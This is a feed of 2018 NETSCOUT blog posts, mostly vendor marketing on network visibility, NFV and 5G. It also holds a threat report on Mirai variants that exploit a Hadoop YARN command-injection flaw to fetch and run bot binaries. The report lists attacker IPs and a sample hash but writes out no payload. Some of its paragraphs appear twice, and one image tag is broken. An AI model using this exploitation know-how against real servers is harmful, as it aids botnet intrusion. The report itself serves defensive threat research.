<p>Applications naturally need to access databases; and these communications now typically traverse the North/South network. A microservice, likely running out of a container, could be doing database I/O across an extended network on prem, hosted by a third party, or residing in a public cloud. Many applications may be accessing this database, and any one business service (e.g. customer service portal) could be relying upon multiple databases. Without end-to-end visibility across these networks it becomes virtually impossible to identify problems and meet service SLAs.</p>

<p><img alt="East West Traffic" data-entity-type="file" data-entity-uuid="f2413a45-8f8d-4fa7-8cbd-fd23ce188b70" src="http://localhost:7996/sites/default/files/inline-images/ChallengeSWblog_image005.png" /></p>

<p>There are other application dependencies (themselves not ‘containerizable’) that typically must traverse increasingly distributed and complex networks: for example, access to the Active Directory (LDAP), or Internet services such as DNS. With current monitoring solutions, these new SDN-enabled configurations can result in limited windows into traffic and application behavior.</p>

<p>Nailing down the real source of a problem becomes difficult, time-consuming and problematic. Point solution tools might rule out potential areas of disruption but struggle to pin-point the true source of the problem.</p>

<h3>Overcoming Software Defined Network Challenges</h3>

<p>Meaningful end-to-end visibility on today’s complex networks must be based on network traffic data. Only wire-data can serve as the real source of ‘truth’ – the insight that is complete and not constrained by application pathway nor diverse, hybrid infrastructure, whether internal or third-party. End-to-end wire-data visibility encompasses unobstructed views into the dependencies spanning the network, servers, service enablers, databases and applications.</p>

<p>It becomes especially challenging (and valuable) to accurately understand the user experience or collect the critical data needed to assess, redesign (re-factor) and optimize applications and networks. Getting to actionable data requires going beyond packet instrumentation. Actionable intelligence on application behavior, service dependencies and pinpointing the root cause of failures requires extracting smart data.</p>

<p><img alt="ASI Model Continuous Visibility" data-entity-type="file" data-entity-uuid="71d0ee42-39bf-44ea-b1ca-8e4154457e86" src="http://localhost:7996/sites/default/files/inline-images/ChallengeSWblog_image006.png" /></p>

<p>Smart data enables an in-depth understanding of application and system performance issues that is independent of the source code. Real traffic based smart data delivers real-time and historic telemetry of all system components including physical and virtual networks, n-tier applications, workloads, protocols, servers, databases, users, and devices.</p>

<h3>Augmenting VMCloud Visibility</h3>

<p>The new VMware Cloud (VMC) exemplifies the flexibility of SDN. VMC allows for the networking and firewalling configurations to be done within a single framework. This makes it much easier for IT operations as they don’t have to define multiple processes for on-prem configurations and issues, and others for the public cloud, such as AWS. NETSCOUT’s Adaptive Service Intelligence™ (ASI) enabled <a href="https://www.netscout.com/news/blog/what-smart-data-how-does-it-help">smart data </a>helps understand application dependencies, and hence what security policies should be established. It also goes further and automatically and consistently provides the analytical framework, the context by which you can measure performance KPI’s mapping to SLAs, and security indicators to Cyber Threats.</p>

<p>With smart, continuous visibility you can know, and document, you are meeting performance SLAs and security KPIs. Only by extending smart monitoring to all the traffic traversing the SDN, from microservices running in containers, across private, public and hybrid environments, can the business:</p>

<ul><li>Fully “illuminate” the data center so all application and microservice communications to and from can be monitored;</li>
	<li>Understand all the changing, application inter-dependencies informing higher performance and a superior user experience;</li>
	<li>Baseline resource usage better for more accurate, flexible, and cost-effective infrastructure design and planning – whether in public cloud or hybrid;</li>
	<li>Allow the accurate assessment, redesign (re-factoring) and optimization of existing applications</li>
</ul><h3>Smart Visibility into Network, Applications, Dependencies, and Security</h3>

<p>NETSCOUT’s vSTREAM allows you to illuminate your entire infrastructure: on-prem, private and public cloud. The foundation for end-to-end visibility is smart data, powered by NETSCOUT’s Adaptive Service Intelligence™ (ASI) technology. With smart data, it is possible to analyze performance, traffic indicators, load and failures as well as offer contextual workflows to quickly triage and find the root cause of application performance degradations. Wire-data is the foundation of NETSCOUT’s smart data: highly scalable metadata that delivers real-time and historic telemetry of all system components including physical and virtual networks, n-tier applications, workloads, protocols, servers, databases, users, and devices. Since every action and transaction is encapsulated in wire-data that traverse hybrid cloud and multi-cloud environments, it offers the best vantage point for end-to-end visibility. More so, smart data based on wire data enables an in-depth understanding of application and system performance issues, that’s independent of the source code and with no need for agents or byte code instrumentation.</p>

<p>This Blog Post was authored by Ray Krug and Arabella Hallawell.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/arm_wrestle.jpg" length="130393" type="image/jpeg"/>
    <guid isPermaLink="false">0c63b034-2cd5-4f11-a6ba-224f9549724d</guid>
    <pubDate>Tue, 27 Nov 2018 12:05:57 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Virtualization Needs Visibility</title>
  <link>http://localhost:7996/blog/virtualization-needs-visibility</link>
  <description>The only truly affordable and practical way to operate a 5G network is to virtualize and automate, change network design, and increasingly manage the network and services from the edge.</description>
  <content:encoded><![CDATA[<p>While 5G undoubtedly holds enormous potential, meeting its demands for increased speed, performance, scalability, and flexible service deployment is likely to result in untenable complexity and OpEx for service operators.</p>

<p>The only truly affordable and practical way to operate a 5G network is to virtualize and automate, change network design, and increasingly manage the network and services from the edge. The application of virtualization technologies such as NFV and SDN to 5G networks is therefore essential if 5G is to be deployed at a reasonable cost.</p>

<p>Many service providers are already adopting NFV and SDN as a means of boosting efficiencies, launching services faster, and supporting a wider range of applications. Indeed,&nbsp;<a href="https://www.mckinsey.com/industries/telecommunications/our-insights/a-future-for-mobile-operators-the-keys-to-successful-reinvention">McKinsey has estimated</a>&nbsp;that the newest technologies in NFV and SDN would let operators lower their capital expenditures by up to 40%, and their network operating expenses by a similar amount.</p>

<p><strong>Are any deployments under way?</strong></p>

<p>Yes. Major service providers in the US, Europe, and South Korea, for example, are well advanced in their testing and initial network deployments. Verizon, AT&amp;T, and Korea Telecom are all utilizing the 1Gbps capability of 5G to provide services such as fixed mobile broadband. In addition to enabling valuable enterprise applications, this supports their SD-WAN deployments which, due to their ability to flexibly instantiate new services, are increasingly being seen by service providers as a way of monetizing 5G, even at this early stage.</p>

<p><strong>Is that the full extent of it?</strong></p>

<p>Right now, both virtualization and 5G are being deployed on a crawl, walk, and run basis. We’re still very much in the crawl phase, with most service providers tentatively deploying both technologies in contained parts of their networks and businesses so that they can understand how they work, learn how to manage them and understand how to deploy them most effectively.</p>

<p>With a myriad of new use cases and technologies, fragmented standards around how VNFs are introduced and orchestrated in the network, 5G is filled with unknowns. The relative immaturity of both 5G and virtualization is therefore currently serving as a barrier to full-scale adoption.</p>

<p><strong>How can we overcome this barrier?</strong></p>

<p>5G and virtualization each rely on a series of other technologies for successful deployment. Both require tools that enable intelligent visibility into the network in order to generate smart data with clear, actionable insights that will feed automated systems, manage performance, and control automation. Power is nothing without control, after all, and accurate control is fundamental to the management of a virtualized network.</p>

<p>Fortunately, these tools exist in the form of virtualized software designed to gather data, analyze it, and present it in a way that it can be actioned by a service provider’s other systems. Critically, the days of using expensive hardware probes to reactively report on network performance are over. They may still be applicable in trial phases during which a new network is established, but only software-based network assurance will be capable of scaling up to handle the volume of data involved as the scale and scope of a 5G deployment heads towards the running phase.</p>

<p><strong>What will happen when 5G is up and running?</strong></p>

<p>The exact nature of the services of the future is still unclear. Despite all the talk about instantaneously downloading 4K video, or enabling connected cars and supporting a plethora of new devices and services with the Internet of Things, the killer apps for 5G are yet to emerge.</p>

<p>What is apparent, though, is that there are universal requirements that will remain the same regardless of what the future holds. The effective running of services and applications on 5G will rely on visibility into the network, and gaining insights that will enable proactive, as opposed to reactive, responses to any network issues.</p>

<p>To learn more visit the&nbsp;<a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-112718-1">NETSCOUT NVF Smarter page</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/vis%20clouds.jpg" length="340123" type="image/jpeg"/>
    <guid isPermaLink="false">f9bd0df2-cf48-4aaa-81c9-5193cd807dda</guid>
    <pubDate>Mon, 26 Nov 2018 15:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Mirai: Not Just for IoT Anymore</title>
  <link>http://localhost:7996/blog/asert/mirai-not-just-iot-anymore</link>
  <description>Botmasters have taken the lessons from developing Internet of Things (IoT) malware and shifted their focus to targeting commodity Linux servers.</description>
  <content:encoded><![CDATA[<ul><li>Linux servers in datacenters have access to more bandwidth than IoT devices on residential networks, making them much more efficient DDoS bots. A handful of well-resourced Linux servers can generate attacks that compete with a much larger IoT botnet.</li>
	<li>Linux servers in datacenters have access to more bandwidth than IoT devices on residential networks, making them much more efficient DDoS bots. A handful of well-resourced Linux servers can generate attacks that compete with a much larger IoT botnet.</li>
</ul><h2>Details</h2>

<p>The Hadoop YARN vulnerability is relatively simple – a command injection flaw that allows the attacker to execute arbitrary shell commands. Last month, Radware <a href="https://blog.radware.com/security/2018/10/new-demonbot-discovered/">discovered</a> this vulnerability being used to install the DemonBot DDoS bot. In many ways this flaw is similar to others we’ve seen exploited in IoT devices. For instance, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8361">CVE-2014-8361</a>, a flaw in Realtek’s UPnP SOAP interface, is also exploitable by sending an HTTP request to a special port with specific parameters to induce the execution of shell commands. The Realtek vulnerability was used to deliver a <a href="https://www.fortinet.com/blog/threat-research/rise-of-one-more-mirai-worm-variant.html">Mirai variant</a>. Our global network of honeypots has been tracking attempts to exploit the Hadoop YARN vulnerability. As seen in <strong>Fig 1</strong>, there are tens of thousands of exploit attempts per day.</p>

<p><img alt="Number of Hadoop YARN Exploits Attempt" data-entity-type="file" data-entity-uuid="85b8702b-68c6-46bd-b1b7-2720f2e11e32" src="http://localhost:7996/sites/default/files/inline-images/Number%20of%20Hadoop%20YARN%20Exploits%20Attempts.png" /></p>

<p><strong>Fig 1: Number of Hadoop YARN Exploits Attempts</strong> What’s surprising is that so many exploit attempts are being delivered by only a handful of unique sources.</p>

<p><strong>Fig 2</strong> shows the number of unique source IP addresses delivering the Hadoop YARN exploit over the same time period. <img alt=": Number of Unique Sources" data-entity-type="file" data-entity-uuid="86970fcb-7e0b-4a40-8c8f-7ca09099a845" src="http://localhost:7996/sites/default/files/inline-images/Number%20of%20Unique%20Sources.png" /></p>

<p><strong>Fig 2: Number of Unique Sources</strong></p>

<p>If we look at the top 5 User-Agents delivering these exploits in <strong>Fig 3</strong>, we can see the attackers using the Python requests library to deliver the HTTP payload.</p>

<p><strong>Fig 3: </strong> The huge number of exploit attempts, coming from a small number of sources, coupled with the fact that none of the malware payloads we’ve seen try to propagate in a worm-able fashion using the Hadoop YARN exploit, and none of the payloads are written in Python, leads us to speculate that a small number of attackers are manually scanning the Internet to exploit this vulnerability. The exploit payloads we’ve seen, as shown in <strong>Fig 4</strong>, are all functionality identical – pull down a malware binary from a URL and execute it.</p>

<p><img alt="Typical Exploit" data-entity-type="file" data-entity-uuid="8c1d912a-1633-4240-a4fd-daa84e60e8a9" src="http://localhost:7996/sites/default/files/inline-images/Typical%20Exploit.png" /></p>

<p><strong>Fig 4: Typical Exploit</strong> What does differ is which malware is delivered in the exploit. For the month of November, we’ve seen 225 unique binaries being delivered. 152 - well over half - of the binaries are being delivered by just one source address. At least a dozen of the samples we’ve examined are clearly variants of Mirai.</p>

<p><img alt="Mirai Variant" data-entity-type="file" data-entity-uuid="8baeb1d1-f8bb-4592-ab7e-34ee7b0815e1" src="http://localhost:7996/sites/default/files/inline-images/Mirai%20Variant.png" /></p>

<p><strong>Fig 5: “VPNFilter” Mirai Variant</strong></p>

<p>Let’s focus on a Mirai variant that calls itself “VPNFilter” (2bcca8ac8d4d80f6740ef14d521284c0, <strong>Fig 5</strong>), even though it has nothing to do with the more <a href="https://blog.talosintelligence.com/2018/05/VPNFilter.html">advanced IoT bot</a>. Across our honeypot network, we saw this exploit being delivered by two source addresses on Nov 16 - 185.244.25.241 and 104.248.170.199. The command-and-control site for this bot is the same IP address that hosts the binary. This particular variant differs from an IoT Mirai in an important way - it only delivers the x86 version of the bot. IoT Mirai variants will poke around a potential victim in order to deliver an executable that’s suitable for its CPU architecture – x86, x64, ARM, MIPS, ARC, etc. This version assumes the Hadoop YARN service is running on a commodity x86 Linux server. When running the “VPNFilter” variant in a sandbox, we immediately noticed it still tries to brute-force factory default usernames and passwords via telnet. If it successfully finds a vulnerable device, instead of directly installing the malware on the victim, it reports the IP address, username, and password to a reporting server, where the attacker can automate the installation of the bot.</p>

<h2>Conclusion</h2>

<p>Mirai is no longer solely targeting IoT devices. While the techniques used to deliver Mirai to both IoT and Linux servers may be similar, it’s much easier for attackers to attack the x86 monoculture of Linux servers than the wide array of CPUs used in IoT devices. The limited number of sources we’ve seen continually scanning for the Hadoop YARN vulnerability may indicate this activity is the work of a small group of attackers. Their goal is clear – to install the malware on as many devices as possible. Once gaining a foothold, Mirai on a Linux server behaves much like an IoT bot and begins brute-forcing telnet usernames and passwords. What’s different now is that among the small, diminutive devices in the botnet lurk fully powered Linux servers.</p>

<p><strong>Fig 1: Number of Hadoop YARN Exploits Attempts</strong> What’s surprising is that so many exploit attempts are being delivered by only a handful of unique sources.</p>

<p><strong>Fig 2</strong> shows the number of unique source IP addresses delivering the Hadoop YARN exploit over the same time period. <img alt=": Number of Unique Sources" data-entity-type="file" data-entity-uuid="86970fcb-7e0b-4a40-8c8f-7ca09099a845" src="http://localhost:7996/sites/default/files/inline-images/Number%20of%20Unique%20Sources.png" /></p>

<p><strong>Fig 2: Number of Unique Sources</strong></p>

<p>If we look at the top 5 User-Agents delivering these exploits in <strong>Fig 3</strong>, we can see the attackers using the Python requests library to deliver the HTTP payload.</p>

<p><strong><img alt="Top 5 User-Agents" data-entity-type="file" data-entity-uuid="e0572faa-7463-43a0-afd6-e124450e88c6" src="http://localhost:7996/sites/default/files/inline-images/Top%205%20User-Agents.png" /></strong></p>

<p><strong>Fig 3: </strong> The huge number of exploit attempts, coming from a small number of sources, coupled with the fact that none of the malware payloads we’ve seen try to propagate in a worm-able fashion using the Hadoop YARN exploit, and none of the payloads are written in Python, leads us to speculate that a small number of attackers are manually scanning the Internet to exploit this vulnerability. The exploit payloads we’ve seen, as shown in <strong>Fig 4</strong>, are all functionality identical – pull down a malware binary from a URL and execute it.</p>

<p>img alt="Typical Exploit" data-entity-type="file" data-entity-uuid="8c1d912a-1633-4240-a4fd-daa84e60e8a9" src="http://localhost:7996/sites/default/files/inline-images/Typical%20Exploit.png" /&gt;</p>

<p><strong>Fig 4: Typical Exploit</strong> What does differ is which malware is delivered in the exploit. For the month of November, we’ve seen 225 unique binaries being delivered. 152 - well over half - of the binaries are being delivered by just one source address. At least a dozen of the samples we’ve examined are clearly variants of Mirai.</p>

<p><img alt="Mirai Variant" data-entity-type="file" data-entity-uuid="8baeb1d1-f8bb-4592-ab7e-34ee7b0815e1" src="http://localhost:7996/sites/default/files/inline-images/Mirai%20Variant.png" /></p>

<p><strong>Fig 5: “VPNFilter” Mirai Variant</strong></p>

<p>Let’s focus on a Mirai variant that calls itself “VPNFilter” (2bcca8ac8d4d80f6740ef14d521284c0, <strong>Fig 5</strong>), even though it has nothing to do with the more <a href="https://blog.talosintelligence.com/2018/05/VPNFilter.html">advanced IoT bot</a>. Across our honeypot network, we saw this exploit being delivered by two source addresses on Nov 16 - 185.244.25.241 and 104.248.170.199. The command-and-control site for this bot is the same IP address that hosts the binary. This particular variant differs from an IoT Mirai in an important way - it only delivers the x86 version of the bot. IoT Mirai variants will poke around a potential victim in order to deliver an executable that’s suitable for its CPU architecture – x86, x64, ARM, MIPS, ARC, etc. This version assumes the Hadoop YARN service is running on a commodity x86 Linux server. When running the “VPNFilter” variant in a sandbox, we immediately noticed it still tries to brute-force factory default usernames and passwords via telnet. If it successfully finds a vulnerable device, instead of directly installing the malware on the victim, it reports the IP address, username, and password to a reporting server, where the attacker can automate the installation of the bot.</p>

<h2>Conclusion</h2>

<p>Mirai is no longer solely targeting IoT devices. While the techniques used to deliver Mirai to both IoT and Linux servers may be similar, it’s much easier for attackers to attack the x86 monoculture of Linux servers than the wide array of CPUs used in IoT devices. The limited number of sources we’ve seen continually scanning for the Hadoop YARN vulnerability may indicate this activity is the work of a small group of attackers. Their goal is clear – to install the malware on as many devices as possible. Once gaining a foothold, Mirai on a Linux server behaves much like an IoT bot and begins brute-forcing telnet usernames and passwords. What’s different now is that among the small, diminutive devices in the botnet lurk fully powered Linux servers.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Mirai%20Not%20Just%20For%20IoT%20.jpg" length="655466" type="image/jpeg"/>
    <guid isPermaLink="false">a4a2724f-1554-4048-836d-86eb4bd104da</guid>
    <pubDate>Wed, 21 Nov 2018 09:59:13 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Why 5G Networks and Services Create an SD-WAN Opportunity for Service Providers</title>
  <link>http://localhost:7996/blog/why-5g-supercharging-sd-wan-opportunity-service-providers</link>
  <description>5G is a true enabler of SD-WAN because it provides high bandwidth and (ultra) low latency in locations where fixed-line networks may not be available, but to ensure the high quality experiences expected, service providers will need to be able to monitor their 5G networks to assure SD-WAN services.</description>
  <content:encoded><![CDATA[<p>5G is a true enabler of SD-WAN because it provides high bandwidth and (ultra) low latency in locations where fixed-line networks may not be available. In addition, it offers enterprises advantages because it can be made available almost immediately, without the standard wait times to be connected to service providers’ fixed line networks. For new offices or even temporary working groups this is a highly valuable service.</p>

<p>Service providers are increasingly targeting this part of the enterprise market with software defined wide area networking (SD-WAN) services to connect branch offices and other fixed locations to the corporate network to enable higher quality real-time applications such as videoconferencing and other high bandwidth unified communications and collaboration applications</p>

<p>To ensure the high quality experiences expected of these can be delivered, service providers will need to be able to monitor their <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="935687ee-21c1-448b-9001-013030d50da8" href="http://localhost:7996/5g-network-visibility" title="5G Network Visibility">5G networks and services </a>to assure SD-WAN.</p>

<p>A further challenge is that SD-WAN services are not comparable in terms of revenue to leased lines or dedicated VPN capacity so the cost of operating them must be carefully controlled. The good news here is that, because 5G is a virtualized environment, software – or virtual – instrumentation to assure the network, providing intelligent visibility into the performance of individual services over the different network types.</p>

<p>This intelligent smart visibility can then be used to identify anomalies, prioritize traffic or ensure additional bandwidth is made available. A further benefit to enterprises utilizing SD-WAN over 5G is that this approach also provides enhanced, integrated security.</p>

<p>The flexibility of SD-WAN service is enabled by the virtualization of 5G networks. However, it is important that the virtual network is service-aware and knows what it is supporting. This is one of the challenges that having intelligent visibility into a network addresses. The visibility provides the insight necessary for the system to make an automated decision that supports a great user experience for the network.</p>

<p>To learn more about assuring virtual and SD-WAN networks visit the <a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-111918-1">NETSCOUT NVF Smarter page</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/5g_supercharge.jpg" length="355175" type="image/jpeg"/>
    <guid isPermaLink="false">3c48a016-dc82-4fa0-b7de-8a9fb55fd61f</guid>
    <pubDate>Mon, 19 Nov 2018 14:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Heather  Broughton</dc:creator>
    </item>
<item>
  <title>Big Data Analytics Will Drive Better Business Insights Through E2e Network Visibility</title>
  <link>http://localhost:7996/blog/big-data-analytics-will-drive-better-business-insights</link>
  <description>Today's operators are migrating from hardware-based networks to software-based networks, and the technologies driving this change are SDN and NFV. Migrating to a software-mediated network introduces several challenges. Operators need to make this network transformation today to address competitive web-scale disruption, exponential data traffic increases, and rising cost...</description>
  <content:encoded><![CDATA[<p>By Stephanie Gibbons, Principal Analyst, Network Infrastructure &amp; Software, Ovum</p>

<p><em>This is the second blog post in a series. Check out Stephanie’s first blog: <a href="https://www.netscout.com/news/blog/service-assurance-evolves-hybrid-networks/?ls=PR-MKTG&amp;lsd=blog-111418-1">Service Assurance Evolves for Hybrid Networks</a></em></p>

<p>Today's operators are migrating from hardware-based networks to software-based networks, and the technologies driving this change are SDN and NFV. Migrating to a software-mediated network introduces several challenges, not the least of which is the complexity of managing a hybrid networking environment during transformation, which includes monitoring and assuring physical and virtual network functions in tandem. Despite this complexity, operators need to make this network transformation today to address competitive web-scale disruption, exponential data traffic increases, and rising cost pressures, all while maintaining a high quality of service.&nbsp;</p>

<p>Cost savings through network optimization and the agility to launch new revenue-generating services are some of the major benefits of SDN/NFV. However, the real asset for operators will be the increase in network and usage data generated over a software-mediated network – and to truly realize the benefits of SDN/NFV, this influx of data needs to be harnessed across the full network, end-to-end (E2E), and analyzed using advanced analytics.</p>

<p><strong>Intelligence Across the Network, From the Core to Access, Will Drive Actionable Business Insights</strong></p>

<p>CSPs are demanding E2E visibility into their networks so that they can correlate data sets at all levels of network to include operations, services, applications, and the customer view. The goal is to automate real-time decisions and drive better business outcomes.</p>

<p>Depending on the data set's level of sophistication, operators can leverage collected and reported analytics around network faults and defined parameters to improve network operations such as resource planning, service migration, and troubleshooting. The major aim of these data sets is to build closed loops to configure and assure services automatically, and to optimize the network resources needed to deliver these services by predicting faults, bottlenecks, and other potential networking problems. This becomes especially compelling in a hybrid networking environment, where the interoperability between physical and virtual network functions is crucial.</p>

<p>The next level of analytics is more predictive in nature. Advanced algorithms will be used to learn from the data generated in real time for better network optimization. A major benefit is that these advanced analytics will enable networks to become "self-healing." However, they will also drive actionable insights, such as sending customized services to specific customers based on their network usage, and enhance the customer experience.</p>

<p>Clearly, analytics will play a critical role in addressing the complexity and other challenges associated with network transformation through SDN/NFV. Operators will turn to trusted partners that can provide E2E network visibility and business insights through advanced big data analytics.&nbsp;</p>

<p>To learn more visit the<a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-111418-2"> NETSCOUT NVF Smarter page</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_1123088558.jpg" length="529942" type="image/jpeg"/>
    <guid isPermaLink="false">f45a6b8d-51de-4b26-b1c1-195bfefb6623</guid>
    <pubDate>Thu, 15 Nov 2018 09:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>NETSCOUT Shines a Light on the Journey to NFV with the Latest Frost &amp; Sullivan Award</title>
  <link>http://localhost:7996/blog/netscout-shines-light-journey-nfv-latest-frost-sullivan-award</link>
  <description>Frost &amp; Sullivan recently chose NETSCOUT for its service provider solutions award for Visionary Innovation Leadership in the Network Data Analytics Industry.</description>
  <content:encoded><![CDATA[<p>Imagine launching a temporary 5G network to cover a global event with the push of a button. The network functions virtualization (NFV) promise to carriers in 2013 was to do just that; change the way networks functioned to benefit the carrier with lower cost, and simpler operations. Deploy new networks and services in a fraction of the time it took to build out networks in the 2000s. How these new networks would be monitored and managed was yet to be explained. As network operators worked to trial and deploy these NFV networks, there has been little in the way of savings. On the contrary, complexities, operations costs, and individual challenges have risen to new levels leaving operators to wonder, who is in control. Operators are now demanding vendors transform to align with carrier’s goals to ensure success. In this unique environment, network vendors must develop solutions that help network operators reduce operations costs while accelerating new service offerings such as 5G and IoT.&nbsp;</p>

<p>Partnering with a vendor who understand this new way of operating is key to obtaining the confidence needed to stay in control, streamline operations, and accelerate the launch of new services. On the journey to realizing the 2013 NFV dream, network operators need service assurance solutions to help them connect the dots, to provide full visibility of services on the hybrid network. These solutions must be the auditors of the customer experience, as well as the providers of unique insights.</p>

<p>According to Frost &amp; Sullivan, these vendors are categorized as “Visionary Innovation Leaders”. Visionary innovators not only help improve business performance, but they also help improve the management processes for individuals.</p>

<p>This is precisely what NETSCOUT strives to do for its customers, and this is the reason why Frost &amp; Sullivan recently chose NETSCOUT for its service provider solutions award for Visionary Innovation Leadership in the Network Data Analytics Industry. “Continuing on its future-focused strategy to disaggregate hardware from software in its offering, NETSCOUT delivers tremendous value to customers, service providers, and network equipment manufacturers. With the development of ASI’s Smart Data technology, and solutions such as nGeniusONE and nGenius Business Analytics (nBA), NETSCOUT enables its customers to cost-effectively convert network traffic into Smart Data, and facilitate its consumption, providing carrier class analytics and insights,” said Jessy Cavazos, Industry Director for Measurement &amp; Instrumentation at Frost &amp; Sullivan.</p>

<p>“NETSCOUT has transformed its business by reshaping and expanding our offering into a software-centric, feature-rich portfolio of Smart Data solutions. Today, our software-based Smart Data instrumentation and analytics can cost effectively address a broad range of use cases spanning from network assurance to application assurance, security, and customer experience. This award from Frost &amp; Sullivan is a recognition of NETSCOUT’s transformation and validation of our software and Smart Data strategy. It would not have been possible without the tireless commitment of our employees to our customers and to each other,” said Anil Singhal, president and chief executive officer, NETSCOUT.</p>

<p>This transformation is part of redesigning NETSCOUT as a vendor, who aligns itself to network operators’ goals. NETSCOUT will continue to shine a light for carriers, providing complete visibility on the road to the NFV promise.</p>

<p>For more information, read the <a href="https://www.netscout.com/news/press-release/frost-sullivan-awards-netscout-visionary-innovation/?ls=PR-MKTG&amp;lsd=blog-111218-1">full announcement</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/shine_a_light_blog_post.jpg" length="278067" type="image/jpeg"/>
    <guid isPermaLink="false">991a042d-8588-4558-a634-a2b212197a6d</guid>
    <pubDate>Tue, 13 Nov 2018 15:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Heather  Broughton</dc:creator>
    </item>
<item>
  <title>Accelerating the Move to NFV and Cloud Infrastructure with Confidence </title>
  <link>http://localhost:7996/blog/nfv-and-cloud-infrastructure-confidence</link>
  <description>NETSCOUT’s service assurance solution for virtualization helped an African mobile operator accelerate their move to NFV and Cloud infrastructure with confidence.</description>
  <content:encoded><![CDATA[<p>Keeping&nbsp;with&nbsp;the industry trend, a large African mobile operator&nbsp;experienced&nbsp;exponential traffic growth&nbsp;driven by video and OTT traffic on their network&nbsp;in which they saw subscriber data&nbsp;double&nbsp;each year. It became apparent that&nbsp;investing in current, traditional&nbsp;network&nbsp;infrastructure&nbsp;was&nbsp;no&nbsp;longer&nbsp;cost-effective.&nbsp;Accordingly, a revised business model and budget restraints drove their&nbsp;decision to&nbsp;accelerate their&nbsp;move toward&nbsp;implementing&nbsp;NFV&nbsp;and&nbsp;Cloud&nbsp;technologies to reduce CAPEX and OPEX.&nbsp;As a result they needed to&nbsp;find a&nbsp;performance&nbsp;monitoring&nbsp;and service assurance&nbsp;solution&nbsp;for their increasingly virtualized&nbsp;or hybrid&nbsp;network.&nbsp;</p>

<p>Their Network Operations and Engineering teams&nbsp;were&nbsp;looking for a service assurance solution that would meet the following conditions:</p>

<ul>
	<li>Provide visibility to NFV/Cloud infrastructure for proactive monitoring and service triage</li>
	<li>Provide a seamless workflow for both legacy/traditional networks and NFV/Cloud</li>
	<li>Software based&nbsp;solution that was&nbsp;optimized for the cloud</li>
	<li>Support&nbsp;for&nbsp;carrier class traffic, scaling to meet traffic growth</li>
	<li>Provide smart data that was extensible to business analytics&nbsp;</li>
	<li>Provided a cost effective, software model for both COTS and&nbsp;cloud applications</li>
</ul>

<p>The customer selected&nbsp;NETSCOUT’s&nbsp;<a href="https://www.netscout.com/product/service-provider/isng-platform/?ls=PR-MKTG&amp;lsd=blog-110518-1">InfiniStreamNG</a>&nbsp;probe instrumentation&nbsp;which is available in COTS and the pure software versions of&nbsp;<a href="https://www.netscout.com/product/vscout-and-vstream/?ls=PR-MKTG&amp;lsd=blog-110518-2">vSCOUT and vSTREAM</a>&nbsp;to provide Network Operations and Engineering with a means to&nbsp;monitor the&nbsp;network during their&nbsp;hybrid journey.&nbsp;NETSCOUT’s service assurance&nbsp;solution&nbsp;for virtualization was selected because it offered cost-effective technology&nbsp;to support&nbsp;their&nbsp;future network&nbsp;rollout. It provided Network Operations and Engineering with&nbsp;holistic visibility and&nbsp;seamless&nbsp;usability of one&nbsp;monitoring&nbsp;system for multiple networks&nbsp;which&nbsp;saved&nbsp;OPEX for troubleshooting applications and offered proactive monitoring&nbsp;along the transformation to NFV/Cloud.&nbsp;</p>

<p>With nGeniusONE the mobile operator was able to set up multiple dashboards to monitor new NFV and cloud infrastructure along with service oriented dashboards to ensure that the new technology was operating within design parameters and delivering&nbsp;desired quality of service. The service oriented&nbsp;dashboards provided an&nbsp;end-to-end view, keeping critical handover points (cloud to legacy infrastructure)&nbsp;in focus, and assuring key services and service enablers throughout the service chain.</p>

<p>Along with these dashboards, service monitors enabled Network Operations and Engineering to proactively monitor services delivered through the cloud and take early action based on service degradations.&nbsp;With this early warning system, the mobile operator was able to take early action on service degradations and minimize calls to customer support as well as customer dissatisfaction.&nbsp;</p>

<p>To provide insights and analytics in support of new cloud services the mobile operator utilized a KAFKA (streaming) data feed of the smart data produced&nbsp;by vSCOUT and vSTREAM&nbsp;and the COTS versions of InfiniStreamNG. This rich, real-time metadata feeds&nbsp;existing business analytics tools&nbsp;and is available for&nbsp;security assurance as well.&nbsp;This smart data&nbsp;contains&nbsp;information on every subscriber session, network infrastructure and services utilized along with the user experience.&nbsp;It is easily accessible and consumable with NETSCOUT’s nGenius Business Analytics or another 3<span data-fontsize="11">rd</span>&nbsp;party business intelligence application.</p>

